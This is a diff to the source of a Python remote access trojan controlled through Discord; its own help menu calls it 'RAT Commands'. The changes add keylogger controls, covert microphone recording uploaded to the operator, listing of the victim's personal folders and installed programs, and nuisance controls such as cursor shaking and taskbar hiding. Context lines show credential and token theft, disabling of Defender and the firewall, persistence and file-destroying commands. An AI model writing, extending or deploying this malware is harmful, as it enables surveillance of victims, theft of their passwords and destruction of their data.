@@ -34,11 +34,10 @@ from PIL import ImageGrab
 import certifi
 import ssl
 
-# Fix SSL for PyInstaller bundled EXE - SIMPLE METHOD
+# Fix SSL for PyInstaller bundled EXE
 if getattr(sys, 'frozen', False):
     os.environ['SSL_CERT_FILE'] = certifi.where()
     os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
-    # Disable SSL verification globally
     ssl._create_default_https_context = ssl._create_unverified_context
 
 # PyCryptodome - handle gracefully if missing
@@ -69,6 +68,10 @@ if os.path.exists(lock):
 open(lock, "w").close()
 
 running = True
+keylog_active = False
+keylog_file = os.environ['TEMP'] + "\\syslog.txt"
+critical_mode = False
+shake_active = False
 
 def cleanup():
     global running
@@ -93,15 +96,10 @@ class Config:
 
 intents = discord.Intents.default()
 intents.message_content = True
-
-# Simple bot initialization - NO connector
 bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
 bot.remove_command("help")
 
 current_path = os.environ['SYSTEMDRIVE'] + "\\"
-keylog_active = False
-keylog_file = os.environ['TEMP'] + "\\syslog.txt"
-critical_mode = False
 
 def is_admin():
     try:
@@ -227,7 +225,6 @@ def grab_discord_tokens():
 def get_chrome_passwords():
     if not CRYPTO_AVAILABLE:
         return ["pycryptodome not installed"]
-    
     chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
     local_state_path = os.path.join(chrome_path, "Local State")
     if not os.path.exists(local_state_path):
@@ -364,6 +361,114 @@ def start_keylog():
     listener.start()
     listener.join()
 
+def start_shake(duration_seconds=10):
+    global shake_active
+    if shake_active:
+        return False
+    shake_active = True
+    def shake_loop():
+        global shake_active
+        start_time = time.time()
+        while shake_active and (time.time() - start_time) < duration_seconds:
+            x, y = pyautogui.position()
+            for dx, dy in [(0, 10), (10, 0), (0, -10), (-10, 0)]:
+                if not shake_active:
+                    break
+                pyautogui.moveTo(x + dx, y + dy, duration=0.01)
+                time.sleep(0.01)
+            time.sleep(0.02)
+        shake_active = False
+    thread = threading.Thread(target=shake_loop, daemon=True)
+    thread.start()
+    return True
+
+def stop_shake():
+    global shake_active
+    shake_active = False
+    return True
+
+def get_recent_downloads():
+    downloads = []
+    try:
+        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
+        if os.path.exists(downloads_path):
+            files = os.listdir(downloads_path)
+            for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_path, x)), reverse=True)[:30]:
+                path = os.path.join(downloads_path, f)
+                if os.path.isfile(path):
+                    size = os.path.getsize(path)
+                    size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
+                    mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
+                    downloads.append(f"📄 {f}\n   Size: {size_str} | Modified: {mtime}\n")
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
+            downloads_reg = winreg.QueryValueEx(key, "{374DE290-123F-4565-9164-39C4925E467B}")[0]
+            if downloads_reg and os.path.exists(downloads_reg) and downloads_reg != downloads_path:
+                files = os.listdir(downloads_reg)
+                for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_reg, x)), reverse=True)[:20]:
+                    path = os.path.join(downloads_reg, f)
+                    if os.path.isfile(path):
+                        size = os.path.getsize(path)
+                        size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
+                        downloads.append(f"📄 {f}\n   Size: {size_str}\n")
+        except:
+            pass
+        return downloads if downloads else ["No recent downloads found"]
+    except:
+        return ["Error getting downloads"]
+
+def get_installed_programs():
+    programs = []
+    try:
+        key_paths = [
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+        ]
+        for key_path in key_paths:
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                for i in range(0, winreg.QueryInfoKey(key)[0]):
+                    try:
+                        subkey_name = winreg.EnumKey(key, i)
+                        subkey = winreg.OpenKey(key, subkey_name)
+                        try:
+                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                            if name:
+                                try:
+                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
+                                    programs.append(f"{name} (v{version})")
+                                except:
+                                    programs.append(name)
+                        except:
+                            pass
+                        winreg.CloseKey(subkey)
+                    except:
+                        pass
+                winreg.CloseKey(key)
+            except:
+                pass
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
+            for i in range(0, winreg.QueryInfoKey(key)[0]):
+                try:
+                    subkey_name = winreg.EnumKey(key, i)
+                    subkey = winreg.OpenKey(key, subkey_name)
+                    try:
+                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                        if name:
+                            programs.append(f"👤 {name}")
+                    except:
+                        pass
+                    winreg.CloseKey(subkey)
+                except:
+                    pass
+            winreg.CloseKey(key)
+        except:
+            pass
+        return list(set(programs)) if programs else ["No programs found"]
+    except:
+        return ["Error getting installed programs"]
+
 def is_authorized():
     async def auth(ctx):
         if ctx.author.id in Config.WHITELISTED:
@@ -376,6 +481,8 @@ def is_authorized():
 async def send_embed(ctx, title, description, color=discord.Color.blue()):
     embed = discord.Embed(title=title, description=description, color=color)
     await ctx.send(embed=embed)
+
+# ========== ALL COMMANDS ==========
 
 @bot.event
 async def on_ready():
@@ -671,15 +778,74 @@ async def media_next(ctx):
 @is_authorized()
 async def list_files(ctx, directory: str = "."):
     try:
+        if directory.startswith("~"):
+            directory = os.path.expanduser(directory)
+        if directory == ".":
+            directory = current_path
+        if not os.path.exists(directory):
+            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
+            return
+        if not os.path.isdir(directory):
+            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
+            return
         files = os.listdir(directory)
-        file_list = []
-        for f in files[:20]:
+        items = []
+        for f in files:
             path = os.path.join(directory, f)
-            file_list.append(f"{'📁' if os.path.isdir(path) else '📄'} {f}")
-        embed = discord.Embed(title=f"Files in {directory}", description="\n".join(file_list), color=discord.Color.blue())
-        if len(files) > 20:
-            embed.set_footer(text=f"+ {len(files)-20} more")
+            if os.path.isdir(path):
+                items.append({'name': f, 'type': 'folder', 'path': path})
+            else:
+                size = os.path.getsize(path)
+                ext = os.path.splitext(f)[1].lower() if os.path.splitext(f)[1] else ""
+                items.append({'name': f, 'type': ext, 'size': size, 'path': path})
+        items.sort(key=lambda x: (0 if x['type'] == 'folder' else 1, x['name'].lower()))
+        chunks = []
+        current_chunk = []
+        for item in items:
+            if item['type'] == 'folder':
+                line = f"📁 {item['name']}/"
+            else:
+                size = item['size']
+                if size < 1024:
+                    size_str = f"{size} B"
+                elif size < 1048576:
+                    size_str = f"{size/1024:.1f} KB"
+                elif size < 1073741824:
+                    size_str = f"{size/1048576:.1f} MB"
+                else:
+                    size_str = f"{size/1073741824:.2f} GB"
+                ext = item['type'][1:] if item['type'] else "noext"
+                ext_emoji = {
+                    'txt': '📄', 'py': '🐍', 'exe': '⚙️', 'dll': '🔧',
+                    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
+                    'mp3': '🎵', 'wav': '🎵', 'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬',
+                    'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
+                    'pdf': '📕', 'doc': '📘', 'docx': '📘', 'xls': '📊', 'xlsx': '📊',
+                    'lua': '📜', 'json': '📋', 'xml': '📋', 'html': '🌐', 'css': '🎨', 'js': '⚡',
+                    'iso': '💿', 'msi': '📦', 'bat': '💻', 'cmd': '💻', 'ps1': '💻',
+                    'reg': '📝', 'ini': '📝', 'cfg': '📝', 'conf': '📝', 'log': '📋'
+                }
+                emoji = ext_emoji.get(ext, '📄')
+                line = f"{emoji} {item['name']} ({size_str})"
+            current_chunk.append(line)
+            if len('\n'.join(current_chunk)) > 1800:
+                chunks.append('\n'.join(current_chunk[:-1]))
+                current_chunk = [line]
+        if current_chunk:
+            chunks.append('\n'.join(current_chunk))
+        if not chunks:
+            await send_embed(ctx, f"📁 {directory}", "Directory is empty", discord.Color.blue())
+            return
+        total_files = len([i for i in items if i['type'] != 'folder'])
+        total_folders = len([i for i in items if i['type'] == 'folder'])
+        embed = discord.Embed(title=f"📁 {directory}", description=f"**{total_folders} folders, {total_files} files**\n\n{chunks[0]}", color=discord.Color.blue())
+        if len(chunks) > 1:
+            embed.set_footer(text=f"Showing 1/{len(chunks)} | Use !listfiles {directory} for more")
         await ctx.send(embed=embed)
+        for i, chunk in enumerate(chunks[1:], start=2):
+            embed = discord.Embed(title=f"📁 {directory} (continued)", description=chunk, color=discord.Color.blue())
+            embed.set_footer(text=f"Showing {i}/{len(chunks)}")
+            await ctx.send(embed=embed)
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
@@ -715,6 +881,26 @@ async def mic_record(ctx, duration: int = 10):
             await send_embed(ctx, "Error", "Failed to record microphone", discord.Color.red())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='canrec')
+@is_authorized()
+async def can_record(ctx, duration: int = 10):
+    if not AUDIO_AVAILABLE:
+        await send_embed(ctx, "Error", "PyAudio not installed - microphone unavailable", discord.Color.red())
+        return
+    if duration < 5:
+        duration = 5
+    if duration > 300:
+        duration = 300
+    await send_embed(ctx, "🎤 Recording Test", f"Recording for {duration} seconds...", discord.Color.blue())
+    path = record_mic(duration)
+    if path and os.path.exists(path):
+        with open(path, 'rb') as f:
+            await ctx.send(file=discord.File(f))
+        os.remove(path)
+        await send_embed(ctx, "✅ Success", "Microphone recording test complete", discord.Color.green())
+    else:
+        await send_embed(ctx, "❌ Failed", "Could not record microphone", discord.Color.red())
 
 @bot.command(name='clipboard')
 @is_authorized()
@@ -865,6 +1051,7 @@ async def keylog(ctx, action: str = None):
             return
         thread = threading.Thread(target=start_keylog, daemon=True)
         thread.start()
+        keylog_active = True
         await send_embed(ctx, "Keylog", "Started", discord.Color.green())
     elif action == 'stop':
         keylog_active = False
@@ -882,6 +1069,22 @@ async def keylog(ctx, action: str = None):
             await send_embed(ctx, "Keylog", "No logs", discord.Color.red())
     else:
         await send_embed(ctx, "Usage", "!keylog start/stop/dump", discord.Color.orange())
+
+@bot.command(name='keylogstart')
+@is_authorized()
+async def keylog_start(ctx):
+    await keylog(ctx, 'start')
+
+@bot.command(name='keylogstop')
+@is_authorized()
+async def keylog_stop(ctx):
+    await keylog(ctx, 'stop')
+
+@bot.command(name='keylogstatus')
+@is_authorized()
+async def keylog_status(ctx):
+    status = "🟢 Running" if keylog_active else "🔴 Stopped"
+    await send_embed(ctx, "⌨️ Keylogger Status", status, discord.Color.blue())
 
 @bot.command(name='grabtokens')
 @is_authorized()
@@ -1024,19 +1227,171 @@ async def exit_bot(ctx):
     await send_embed(ctx, "Exiting", "Goodbye", discord.Color.dark_grey())
     sys.exit(0)
 
+@bot.command(name='downloads')
+@is_authorized()
+async def recent_downloads(ctx):
+    downloads = get_recent_downloads()
+    output = "\n".join(downloads[:30])
+    if len(output) > 1900:
+        output = output[:1900] + "..."
+    await send_embed(ctx, "📥 Recent Downloads", output, discord.Color.blue())
+
+@bot.command(name='installed')
+@is_authorized()
+async def installed_programs(ctx):
+    await send_embed(ctx, "📦 Getting installed programs...", "This may take a moment", discord.Color.blue())
+    programs = get_installed_programs()
+    output = "\n".join(programs[:100])
+    if len(output) > 1900:
+        output = output[:1900] + "..."
+    await send_embed(ctx, "📦 Installed Programs", f"```{output}```", discord.Color.green())
+
+@bot.command(name='shake')
+@is_authorized()
+async def shake_cursor(ctx, duration: int = 10):
+    global shake_active
+    if duration < 5:
+        duration = 5
+    if duration > 300:
+        duration = 300
+    if shake_active:
+        await send_embed(ctx, "❌ Error", "Shake already running", discord.Color.red())
+        return
+    if start_shake(duration):
+        await send_embed(ctx, "🔄 Cursor Shake", f"Started for {duration} seconds", discord.Color.blue())
+    else:
+        await send_embed(ctx, "❌ Error", "Could not start shake", discord.Color.red())
+
+@bot.command(name='shakestop')
+@is_authorized()
+async def shake_stop(ctx):
+    global shake_active
+    if stop_shake():
+        await send_embed(ctx, "⏹️ Shake Stopped", "Cursor shake has been stopped", discord.Color.green())
+    else:
+        await send_embed(ctx, "❌ Error", "No shake running", discord.Color.red())
+
+@bot.command(name='mute')
+@is_authorized()
+async def mute_audio(ctx):
+    try:
+        subprocess.run('powershell -Command "(New-Object -ComObject Wscript.Shell).SendKeys([char]174)"', shell=True, capture_output=True)
+        await send_embed(ctx, "🔇 Muted", "System audio has been muted", discord.Color.red())
+    except:
+        await send_embed(ctx, "❌ Error", "Could not mute audio", discord.Color.red())
+
+@bot.command(name='unmute')
+@is_authorized()
+async def unmute_audio(ctx):
+    try:
+        subprocess.run('powershell -Command "(New-Object -ComObject Wscript.Shell).SendKeys([char]174)"', shell=True, capture_output=True)
+        await send_embed(ctx, "🔊 Unmuted", "System audio has been unmuted", discord.Color.green())
+    except:
+        await send_embed(ctx, "❌ Error", "Could not unmute audio", discord.Color.red())
+
+@bot.command(name='capslock')
+@is_authorized()
+async def caps_lock_toggle(ctx):
+    try:
+        pyautogui.press('capslock')
+        await send_embed(ctx, "🔠 Caps Lock", "Toggled caps lock", discord.Color.blue())
+    except:
+        await send_embed(ctx, "❌ Error", "Could not toggle caps lock", discord.Color.red())
+
+@bot.command(name='capslockon')
+@is_authorized()
+async def caps_lock_on(ctx):
+    try:
+        # Check if already on
+        import ctypes
+        if ctypes.windll.user32.GetKeyState(0x14) & 0x0001:
+            await send_embed(ctx, "🔠 Caps Lock", "Already ON", discord.Color.orange())
+            return
+        pyautogui.press('capslock')
+        await send_embed(ctx, "🔠 Caps Lock", "Turned ON", discord.Color.blue())
+    except:
+        await send_embed(ctx, "❌ Error", "Could not turn caps lock on", discord.Color.red())
+
+@bot.command(name='capslockoff')
+@is_authorized()
+async def caps_lock_off(ctx):
+    try:
+        import ctypes
+        if not (ctypes.windll.user32.GetKeyState(0x14) & 0x0001):
+            await send_embed(ctx, "🔠 Caps Lock", "Already OFF", discord.Color.orange())
+            return
+        pyautogui.press('capslock')
+        await send_embed(ctx, "🔠 Caps Lock", "Turned OFF", discord.Color.blue())
+    except:
+        await send_embed(ctx, "❌ Error", "Could not turn caps lock off", discord.Color.red())
+
+@bot.command(name='fullscreenlock')
+@is_authorized()
+async def fullscreen_lock(ctx):
+    try:
+        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
+        await send_embed(ctx, "🖥️ Fullscreen Lock", "Taskbar hidden. Use !fullscreenunlock to restore", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
+
+@bot.command(name='fullscreenunlock')
+@is_authorized()
+async def fullscreen_unlock(ctx):
+    try:
+        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+        ctypes.windll.user32.ShowWindow(hwnd, 1)
+        await send_embed(ctx, "🖥️ Fullscreen Unlocked", "Taskbar restored", discord.Color.green())
+    except Exception as e:
+        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
+
+@bot.command(name='downloadsfolder')
+@is_authorized()
+async def list_downloads_folder(ctx):
+    path = os.path.join(os.path.expanduser('~'), 'Downloads')
+    await list_files(ctx, path)
+
+@bot.command(name='documentsfolder')
+@is_authorized()
+async def list_documents_folder(ctx):
+    path = os.path.join(os.path.expanduser('~'), 'Documents')
+    await list_files(ctx, path)
+
+@bot.command(name='picturesfolder')
+@is_authorized()
+async def list_pictures_folder(ctx):
+    path = os.path.join(os.path.expanduser('~'), 'Pictures')
+    await list_files(ctx, path)
+
+@bot.command(name='videosfolder')
+@is_authorized()
+async def list_videos_folder(ctx):
+    path = os.path.join(os.path.expanduser('~'), 'Videos')
+    await list_files(ctx, path)
+
+@bot.command(name='desktopfolder')
+@is_authorized()
+async def list_desktop_folder(ctx):
+    path = os.path.join(os.path.expanduser('~'), 'Desktop')
+    await list_files(ctx, path)
+
 @bot.command(name='help')
 async def help_cmd(ctx):
     embed = discord.Embed(title="RAT Commands", color=discord.Color.purple())
     embed.add_field(name="Info", value="`info`, `sysinfo`, `idletime`, `geolocate`", inline=False)
     embed.add_field(name="Control", value="`lock`, `crash`, `shutdown`, `restart`, `critical`, `rootkit`", inline=False)
-    embed.add_field(name="Files", value="`cd`, `dir`, `listfiles`, `download`, `upload`, `delete`", inline=False)
-    embed.add_field(name="Input", value="`click`, `press`, `screenshot`, `blockinput`, `unblockinput`", inline=False)
-    embed.add_field(name="Media", value="`webcampic`, `mic`, `voice`, `playpause`, `nexttrack`, `wallpaper`", inline=False)
+    embed.add_field(name="Files", value="`cd`, `dir`, `listfiles`, `download`, `upload`, `delete`, `downloads`, `installed`", inline=False)
+    embed.add_field(name="File Browsing", value="`downloadsfolder`, `documentsfolder`, `picturesfolder`, `videosfolder`, `desktopfolder`", inline=False)
+    embed.add_field(name="Input", value="`click`, `press`, `screenshot`, `blockinput`, `unblockinput`, `shake`, `shakestop`", inline=False)
+    embed.add_field(name="Media", value="`webcampic`, `mic`, `canrec`, `voice`, `playpause`, `nexttrack`, `wallpaper`", inline=False)
+    embed.add_field(name="Audio", value="`mute`, `unmute`, `capslock`, `capslockon`, `capslockoff`", inline=False)
+    embed.add_field(name="Display", value="`fullscreenlock`, `fullscreenunlock`", inline=False)
     embed.add_field(name="Destructive", value="`filescramble`, `filedestroy`, `fileransom`, `virus`, `msgbox`", inline=False)
     embed.add_field(name="Security", value="`grabtokens`, `password`, `disabledefender`, `disablefirewall`, `disabletaskmgr`, `enabletaskmgr`", inline=False)
+    embed.add_field(name="Keylogger", value="`keylog start/stop/dump`, `keylogstart`, `keylogstop`, `keylogstatus`", inline=False)
     embed.add_field(name="Process", value="`listprocess`, `prockill`, `listapps`, `open`, `close`", inline=False)
     embed.add_field(name="Persistence", value="`persistence`, `killswitch`, `startup`", inline=False)
-    embed.add_field(name="Other", value="`cmd`, `website`, `clipboard`, `keylog`, `exit`", inline=False)
+    embed.add_field(name="Other", value="`cmd`, `website`, `clipboard`, `exit`", inline=False)
     await ctx.send(embed=embed)
 
 @bot.command(name='startup')
